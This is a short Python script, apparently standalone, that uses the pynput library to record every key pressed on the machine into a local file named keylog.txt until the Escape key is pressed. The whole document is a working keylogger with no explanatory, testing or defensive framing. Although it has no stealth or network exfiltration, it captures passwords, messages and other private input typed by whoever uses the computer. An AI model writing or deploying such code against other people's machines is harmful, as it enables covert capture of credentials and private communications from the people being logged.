from pynput.keyboard import Key, Listener

def on_press(key):
    with open('keylog.txt', 'a') as log:
        if key == Key.space:
            log.write(' ')
        elif key == Key.enter:
            log.write('\n')
        elif key == Key.esc:
            return False
        else:
            log.write(str(key).replace("'", ""))

def on_release(key):
    pass

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
